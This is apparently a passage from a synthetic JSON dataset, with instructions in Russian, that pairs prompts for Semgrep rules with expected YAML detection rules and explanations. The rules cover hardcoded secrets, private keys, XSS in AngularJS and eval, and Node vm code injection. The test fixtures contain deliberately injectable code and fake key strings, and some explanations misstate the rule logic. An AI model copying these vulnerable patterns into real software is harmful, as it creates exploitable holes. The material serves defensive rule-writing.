    "output": "rules:\n- id: hardcoded-secret-rsa-passphrase\n  message: >-\n    Found the use of an hardcoded passphrase for RSA. The passphrase can be easily discovered, and therefore\n    should not be stored in source-code. It is recommended to remove the passphrase from source-code,\n    and use system environment variables or a restricted configuration file.\n  languages:\n  - ruby\n  severity: WARNING\n  metadata:\n    technology:\n    - ruby\n    - secrets\n    category: security\n    references:\n    - https://cwe.mitre.org/data/definitions/522.html\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: HIGH\n  patterns:\n  - pattern-either:\n    - pattern: OpenSSL::PKey::RSA.new(..., '...')\n    - pattern: OpenSSL::PKey::RSA.new(...).to_pem(..., '...')\n    - pattern: OpenSSL::PKey::RSA.new(...).export(..., '...')\n    - patterns:\n      - pattern-inside: |\n          $OPENSSL = OpenSSL::PKey::RSA.new(...)\n          ...\n      - pattern-either:\n        - pattern: |\n            $OPENSSL.export(...,'...')\n        - pattern: |\n            $OPENSSL.to_pem(...,'...')\n    - patterns:\n      - pattern-either:\n        - patterns:\n          - pattern-inside: |\n              $ASSIGN = '...'\n              ...\n          - pattern: OpenSSL::PKey::RSA.new(..., $ASSIGN)\n        - patterns:\n          - pattern-inside: |\n              def $METHOD1(...)\n              ...\n              $ASSIGN = '...'\n              ...\n              end\n              ...\n              def $METHOD2(...)\n              ...\n              end\n          - pattern: OpenSSL::PKey::RSA.new(..., $ASSIGN)\n        - patterns:\n          - pattern-inside: |\n              $ASSIGN = '...'\n              ...\n              def $METHOD(...)\n                $OPENSSL = OpenSSL::PKey::RSA.new(...)\n              ...\n              end\n              ...\n          - pattern-either:\n            - pattern: $OPENSSL.export(...,$ASSIGN)\n            - pattern: $OPENSSL.to_pem(...,$ASSIGN)\n        - patterns:\n          - pattern-inside: |\n              def $METHOD1(...)\n              ...\n              $OPENSSL = OpenSSL::PKey::RSA.new(...)\n              ...\n              $ASSIGN = '...'\n              ...\n              end\n              ...\n          - pattern-either:\n            - pattern: $OPENSSL.export(...,$ASSIGN)\n            - pattern: $OPENSSL.to_pem(...,$ASSIGN)\n        - patterns:\n          - pattern-inside: |\n              def $METHOD1(...)\n              ...\n              $ASSIGN = '...'\n              ...\n              end\n              ...\n              def $METHOD2(...)\n              ...\n              $OPENSSL = OpenSSL::PKey::RSA.new(...)\n              ...\n              end\n              ...\n          - pattern-either:\n            - pattern: $OPENSSL.export(...,$ASSIGN)\n            - pattern: $OPENSSL.to_pem(...,$ASSIGN)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных паролей или фраз для шифрования RSA в Ruby-коде. Анализируются различные конструкции, включающие методы OpenSSL::PKey::RSA.new, .to_pem и .export, которые принимают второй аргумент в виде строки. Правило проверяет наличие жестко заданных строковых литералов ('...') в качестве второго аргумента этих методов, что указывает на возможное использование жестко закодированного секрета. Безопасным считается использование переменных окружения или других механизмов хранения секретов, таких как ENV['SECRET'].\n\n# Ключевые элементы:\n- ID: hardcoded-secret-rsa-passphrase\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "hardcoded-secret-rsa-passphrase",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detected-twilio-api-key\nОписание уязвимости: Twilio API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-twilio-api-key.txt\n# ruleid: detected-twilio-api-key\nSK575796bb721246b5fe003bcc32ebde77\n\n# ok: detected-twilio-api-key\nSKblah  # Ограничиваем длину\n\nОпасные паттерны:\n• SK575796bb721246b5fe003bcc32ebde77\n• const apiKey = 'SK123456789abcdef0123456789abcdef';\n\nБезопасные паттерны:  \n• SKblah\n• let key = 'sk_test_abc123';\n\nЛегенда аннотаций:\n- // ruleid:detected-twilio-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-twilio-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-twilio-api-key\n  pattern-regex: SK[0-9a-fA-F]{32}\n  languages: [regex]\n  message: Twilio API Key detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    technology:\n    - secrets\n    - twilio\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, начинающихся с 'SK' и следующих за ними 32 символа, которые могут быть буквами или цифрами в верхнем или нижнем регистре. Это соответствует формату идентификаторов Twilio API Key. Правило применимо только к текстам на языке regex. Если найдено совпадение, выдается сообщение о том, что обнаружен Twilio API Key, с указанием степени серьезности ошибки и соответствующих метаданных.\n\n# Ключевые элементы:\n- ID: detected-twilio-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-twilio-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: functionapp-authentication-enabled\nОписание уязвимости: Enabling authentication ensures that all communications in the application are authenticated. The `auth_settings` block needs to be filled out with the appropriate auth backend settings\nCWE: CWE-287: Improper Authentication\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-287: Improper Authentication\n- Серьезность: INFO\n\nКонтекст кода:\n// File: functionapp-authentication-enabled.tf\nresource \"azurerm_function_app\" \"good_example\" {\n  name                = \"example-function-app\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_function_app_plan.example.id\n\n  auth_settings {\n    enabled = true\n  }\n}\n\n# ruleid: functionapp-authentication-enabled\nresource \"azurerm_function_app\" \"bad_example\" {\n  name                = \"example-function-app\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_function_app_plan.example.id\n}\n\n\n# ruleid: functionapp-authentication-enabled\nresource \"azurerm_function_app\" \"bad_example\" {\n  name                = \"example-function-app\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_function_app_plan.example.id\n\n  auth_settings {\n    enabled = false\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_function_app\" \"bad_example\" { ... auth_settings { enabled = false } ... }\n• resource \"azurerm_function_app\" \"bad_example\" { ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_function_app\" \"good_example\" { ... auth_settings { enabled = true } ... }\n\nЛегенда аннотаций:\n- // ruleid:functionapp-authentication-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:functionapp-authentication-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: functionapp-authentication-enabled\n  message: >-\n    Enabling authentication ensures that all communications in the application are authenticated.\n    The `auth_settings` block needs to be filled out with the appropriate auth backend settings\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_function_app\" \"...\" {\n      ...\n        auth_settings {\n          ...\n          enabled = true\n          ...\n        }\n      ...\n      }\n  - pattern-either:\n    - pattern-inside: |\n        resource \"azurerm_function_app\" \"...\" {\n        ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_function_app\" \"...\" {\n        ...\n          auth_settings {\n            ...\n            enabled = false\n            ...\n          }\n        ...\n        }\n  metadata:\n    cwe:\n    - 'CWE-287: Improper Authentication'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#enabled\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A07:2021 - Identification and Authentication Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Function App в Terraform конфигурациях HCL. Правило проверяет наличие блока auth_settings внутри ресурса и наличие параметра enabled со значением true. Если параметр enabled отсутствует или имеет значение false, то это считается опасным примером, так как аутентификация приложения не включена. Безопасным примером является случай, когда блок auth_settings присутствует и включает enabled=true.\n\n# Ключевые элементы:\n- ID: functionapp-authentication-enabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "functionapp-authentication-enabled",
      "language": "hcl",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: detect-angular-trust-as-js-method\nОписание уязвимости: The use of $sce.trustAsJs can be dangerous if unsanitized user input flows through this API.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detect-angular-trust-as-js-method.js\nvar app = angular.module('MyApp', []);\napp.controller('myCtrl', function($scope, $sce) {\n\n$scope.userInput = 'foo';\n    $scope.sayHello = function() {\n     // ruleid:detect-angular-trust-as-js-method\n     $scope.trustedurl = $sce.trustAsJs($scope.html);\n     // ruleid:detect-angular-trust-as-js-method\n     input = $scope.html\n     $scope.trustedurl = $sce.trustAsJs(input);\n\n\n     //Data is not coming from user input\n     $scope.trustedurl = $sce.trustAsJs('stringLiteral');\n   };\n\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) {\n $scope.userInput = 'foo';\n $scope.sayHello = function() {\n  // ruleid:detect-angular-trust-as-js-method\n  $scop\n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) {\n $scope.userInput = 'foo';\n $scope.sayHello = function() {\n  var input = $scope.userInput;\n  $scope.trustedurl =\n\nБезопасные паттерны:  \n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) {\n $scope.userInput = 'foo';\n $scope.sayHello = function() {\n  $scope.trustedurl = $sce.trustAsJs('stringLiteral')\n• var app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) {\n $scope.userInput = 'foo';\n $scope.sayHello = function() {\n  var input = 'stringLiteral';\n  $scope.trustedurl = \n\nЛегенда аннотаций:\n- // ruleid:detect-angular-trust-as-js-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-angular-trust-as-js-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-angular-trust-as-js-method\n  message: >-\n    The use of $sce.trustAsJs can be dangerous if unsanitized user input flows through this API.\n  metadata:\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://docs.angularjs.org/api/ng/service/$sce#trustAsJs\n    - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    category: security\n    technology:\n    - angular\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $SOURCE = $scope.$INPUT;\n        $sce.trustAsJs($SOURCE);\n    - pattern: |\n        $sce.trustAsJs($scope.$INPUT);\n  - pattern-inside: |\n      app.controller(..., function($scope,$sce){\n      ...\n      });\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода $sce.trustAsJs в Angular, который может быть опасным, если входные данные пользователя не были должным образом очищены или санкционированы перед передачей этому методу. Анализ выполняется путем поиска шаблонов, где переменная, предположительно содержащая пользовательский ввод ($SOURCE или $scope.$INPUT), передается напрямую методу trustAsJs. Шаблон также учитывает контекст использования контроллера Angular, проверяя наличие ключевого слова 'controller' внутри функции.\n\n# Ключевые элементы:\n- ID: detect-angular-trust-as-js-method\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detect-angular-trust-as-js-method",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: detected-private-key\nОписание уязвимости: Private Key detected. This is a sensitive credential and should not be hardcoded here. Instead, store this in a separate, private file.\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-private-key.txt\n# ruleid: detected-private-key\n-----BEGIN PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\n# ruleid: detected-private-key\n-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\n# ruleid: detected-private-key\n-----BEGIN DSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\n# ruleid: detected-private-key\n-----BEGIN OPENSSH PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\n# ruleid: detected-private-key\n-----BEGIN EC PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\n# ruleid: detected-private-key\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\n# ok: detected-private-key\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nabababababababababababababababab  # Ограничиваем длину\n\nОпасные паттерны:\n• -----BEGIN PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n• -----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n• -----BEGIN DSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAjosMtDUqbE1/8zxZac1t8fkh2SxGuMXHk9yxniyM2m76donW\n\nБезопасные паттерны:  \n• -----BEGIN ENCRYPTED PRIVATE KEY-----\nabababababababababababababababab\n• -----BEGIN PRIVATE KEY-----\nabcdefghijkl\n• -----BEGIN RSA PRIVATE KEY-----\nabcdefghijkl\n\nЛегенда аннотаций:\n- // ruleid:detected-private-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-private-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-private-key\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: '-----BEGIN $TYPE PRIVATE KEY----- $KEY'\n      - metavariable-regex:\n          metavariable: $TYPE\n          regex: (?i)([dr]sa|ec|openssh|encrypted)?\n    - patterns:\n      - pattern: |\n          -----BEGIN PRIVATE KEY-----\n          $KEY\n  - metavariable-analysis:\n      metavariable: $KEY\n      analyzer: entropy\n  languages: [generic]\n  message: Private Key detected. This is a sensitive credential and should not be hardcoded here. Instead,\n    store this in a separate, private file.\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/grab/secret-scanner/blob/master/scanner/signatures/pattern.go\n    category: security\n    technology:\n    - secrets\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных приватных ключей в исходном коде. Оно использует шаблон, который ищет строки, начинающиеся с '-----BEGIN' и содержащие слова 'PRIVATE KEY', за которыми следует тип ключа ('RSA', 'DSA', 'EC', 'OPENSSH' или 'ENCRYPTED'). Вторым условием является проверка энтропии содержимого ($KEY), чтобы убедиться, что оно не является случайной строкой. Если оба условия выполняются, выдается предупреждение о наличии жестко закодированного приватного ключа.\n\n# Ключевые элементы:\n- ID: detected-private-key\n- Язык: generic \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-private-key",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения vm-runincontext-injection\nОписание уязвимости: The `vm` module enables compiling and running code within V8 Virtual Machine contexts. The `vm` module is not a security mechanism. Do not use it to run untrusted code. If code passed to `vm` functions is controlled by user input it could result in command injection. Do not let user input in `vm` functions.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: vm-runincontext-injection.js\nconst vm = require('vm')\n\nexports.handler = async (event) => {\n    var input = event['something']\n    var sandbox = {\n        foo: input\n    }\n    // ruleid: vm-runincontext-injection\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n\n\n    const code = `\n        var x = ${event['something']};\n    `\n    // ruleid: vm-runincontext-injection\n    vm.runInThisContext(code)\n\n\n    const parsingContext = vm.createContext({name: 'world'})\n    const code1 = `return 'hello ' + '${event['something']}'`\n    // ruleid: vm-runincontext-injection\n    const fn1 = vm.compileFunction(code1, [], { parsingContext })\n\n\n    const context = vm.createContext({name: event['something']})\n    const code2 = `return 'hello ' name`\n    // ruleid: vm-runincontext-injection\n    const fn2 = vm.compileFunction(code2, [], { parsingContext: context })\n\n\n    // ruleid: vm-runincontext-injection\n    const script = new vm.Script(`\n        function add(a, b) {\n          return a + ${event['something']};\n        }\n\n        const x = add(1, 2);\n    `);\n    script.runInThisContext();\n\n\n    // ok: vm-runincontext-injection\n    var sandbox2 = {\n        foo: 1\n    }\n    vm.createContext(sandbox2)\n    vm.runInContext('safeEval(orderLinesData)', sandbox2, { timeout: 2000 })\n\n\n    // ok: vm-runincontext-injection\n    var sandbox3 = {\n        foo: 1\n    }\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox3, { timeout: 2000 })\n\n\n    const code2 = `\n        var x = 1;\n    `\n    // ok: vm-runincontext-injection\n    vm.runInThisContext(code2)\n\n\n    const parsingContext = vm.createContext({name: 'world'})\n    const code3 = `return 'hello ' + name`\n    // ok: vm-runincontext-injection\n    const fn3 = vm.compileFunction(code3, [], { parsingContext })\n\n\n    // ok: vm-runincontext-injection\n    const script1 = new vm.Script(`\n        function add(a, b) {\n          return a + b;\n        }\n\n        const x = add(1, 2);\n    `);\n\n    script1.runInThisCont  # Ограничиваем длину\n\nОпасные паттерны:\n• vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n• vm.runInThisContext(code)\n• const fn1 = vm.compileFunction(code1, [], { parsingContext })\n\nБезопасные паттерны:  \n• var sandbox2 = { foo: 1 }; vm.createContext(sandbox2); vm.runInContext('safeEval(orderLinesData)', sandbox2, { timeout: 2000 })\n• var sandbox3 = { foo: 1 }; vm.runInNewContext('safeEval(orderLinesData)', sandbox3, { timeout: 2000 })\n• const code2 = \n        var x = 1;\n    ; vm.runInThisContext(code2)\n\nЛегенда аннотаций:\n- // ruleid:vm-runincontext-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:vm-runincontext-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: vm-runincontext-injection\n  message: >-\n    The `vm` module enables compiling and running code within V8 Virtual Machine contexts.\n    The `vm` module is not a security mechanism. Do not use it to run untrusted code.\n    If code passed to `vm` functions is controlled by user input it could result in command injection.\n    Do not let user input in `vm` functions.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    category: security\n    technology:\n    - javascript\n    - aws-lambda\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: $EVENT\n    - pattern-either:\n      - pattern-inside: |\n          exports.handler = function ($EVENT, ...) {\n            ...\n          }\n      - pattern-inside: |\n          function $FUNC ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n      - pattern-inside: |\n          $FUNC = function ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          require('vm');\n          ...\n      - pattern-inside: |\n          import 'vm'\n          ...\n    - pattern-either:\n      - pattern: $VM.runInContext($X,...)\n      - pattern: $VM.runInNewContext($X,...)\n      - pattern: $VM.runInThisContext($X,...)\n      - pattern: $VM.compileFunction($X,...)\n      - pattern: new $VM.Script($X,...)\n      - pattern: new $VM.SourceTextModule($X,...)\n      - pattern: runInContext($X,...)\n      - pattern: runInNewContext($X,...)\n      - pattern: runInThisContext($X,...)\n      - pattern: compileFunction($X,...)\n      - pattern: new Script($X,...)\n      - pattern: new SourceTextModule($X,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных функций модуля 'vm' в JavaScript-коде. Анализ выполняется методом taint, отслеживая переменные, которые могут быть подвержены влиянию пользовательского ввода. В источнике (source) ищутся выражения, содержащие переменную '$EVENT', которая может представлять входные данные пользователя. В sinkах определяются вызовы функций модуля 'vm', таких как 'runInContext', 'runInNewContext', 'runInThisContext', 'compileFunction' и другие, где аргумент передается напрямую или через выражение, содержащее потенциально контролируемую пользователем переменную.\n\n# Ключевые элементы:\n- ID: vm-runincontext-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "vm-runincontext-injection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: eval-detected\nОписание уязвимости: Detected the use of eval(...). This can introduce  a Cross-Site-Scripting (XSS) vulnerability if this  comes from user-provided input. Follow OWASP best  practices to ensure you handle XSS within a JavaScript context correct, and consider using safer APIs to evaluate  user-input such as JSON.parse(...). \nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: html",
    "input": "Требования:\n- Язык: html\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: eval-detected.html\n<!-- ruleid: eval-detected -->\n<script>\n    const rootDiv = document.getElementById('root');\n    import { sanitize } from \"dompurify\"\n    const hash = location.hash.slice(1)\n    \n    \n    eval(hash1)\n    \n    const obj2 = { foo: 'baz', y: hash1 };\n    \n    const clonedObj = { ...obj2 };\n    \n    eval(clonedObj.y);\n    \n    // ok: eval-detected\n    eval(\"safe\");\n    \n    \n    \n    </script>  # Ограничиваем длину\n\nОпасные паттерны:\n• <script>eval(userInput)</script>\n• <script>eval('bad' + userInput)</script>\n\nБезопасные паттерны:  \n• <script>eval('safe')</script>\n• <script>eval('\"safe\"')</script>\n\nЛегенда аннотаций:\n- // ruleid:eval-detected: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:eval-detected: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: eval-detected\n    message: >-\n      Detected the use of eval(...). This can introduce \n      a Cross-Site-Scripting (XSS) vulnerability if this \n      comes from user-provided input. Follow OWASP best \n      practices to ensure you handle XSS within a JavaScript\n      context correct, and consider using safer APIs to evaluate \n      user-input such as JSON.parse(...). \n    metadata:\n      cwe:\n      - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n      owasp:\n      - A07:2017 - Cross-Site Scripting (XSS)\n      - A03:2021 - Injection\n      category: security\n      technology:\n      - browser\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n      - audit\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      references:\n      - https://owasp.org/Top10/A03_2021-Injection\n      - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n    languages: \n        - html\n    severity: WARNING\n    patterns:\n      - pattern-inside: |\n          <script ...>$...A</script>\n      - metavariable-pattern:\n          metavariable: $...A\n          language: javascript\n          patterns:\n            - pattern-either:\n                - pattern: $X(...)\n            - pattern-not: $X(\"...\")\n            - metavariable-regex:\n                metavariable: $X\n                regex: ^(eval)$\n            - focus-metavariable: $X\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции eval(...) в HTML-коде. Оно использует шаблон внутри тега <script>, где метавариабельная подстановка $...A представляет содержимое атрибута сценария. Далее проверяется наличие вызова функции eval() через метавариабельную подстановку $X(...), исключая случаи, когда строка передается напрямую в кавычках ($X(\"...\")). Также используется регулярное выражение для точного совпадения имени функции eval.\n\n# Ключевые элементы:\n- ID: eval-detected\n- Язык: html \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "eval-detected",
      "language": "html",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: detect-angular-element-methods\nОписание уязвимости: Use of angular.element can lead to XSS if user-input is treated as part of the HTML element within `$SINK`. It is recommended to contextually output encode user-input, before inserting into `$SINK`. If the HTML needs to be preserved it is recommended to sanitize the input using $sce.getTrustedHTML or $sanitize.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-angular-element-methods.js\nvar app = angular.module('MyApp', []);\napp.controller('myCtrl', function($scope,$sanitize) {\n    $rootScope.foo = getData();\n    $scope.foo = getData();\n    // ok: detect-angular-element-methods\n    angular.element('div').html('hi')\n    // We're telling Semgrep that *every* occurrence of $rootScope is tainted,\n    // we need to write the rule in a different way!\n    // todook: detect-angular-element-methods\n    angular.element('div').html($rootScope.foo)\n    // ok: detect-angular-element-methods\n    angular.element('div').html($scope.foo)\n    // ruleid: detect-angular-element-methods\n    angular.element('div').html($rootScope)\n    // ruleid: detect-angular-element-methods\n    angular.element('div').html($scope)\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• angular.element('div').html($rootScope.foo)\n• angular.element('div').html($scope)\n\nБезопасные паттерны:  \n• angular.element('div').html('hi')\n• angular.element('div').html($scope.foo)\n\nЛегенда аннотаций:\n- // ruleid:detect-angular-element-methods: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-angular-element-methods: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-angular-element-methods\n  message: >-\n    Use of angular.element can lead to XSS if user-input is treated as part of the HTML element within\n    `$SINK`. It is recommended to contextually output encode user-input, before inserting into `$SINK`. If\n    the HTML needs to be preserved it is recommended to sanitize the input using $sce.getTrustedHTML or\n    $sanitize.\n  metadata:\n    confidence: LOW\n    references:\n    - https://docs.angularjs.org/api/ng/function/angular.element\n    - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf\n    category: security\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    technology:\n    - angularjs\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: INFO\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - 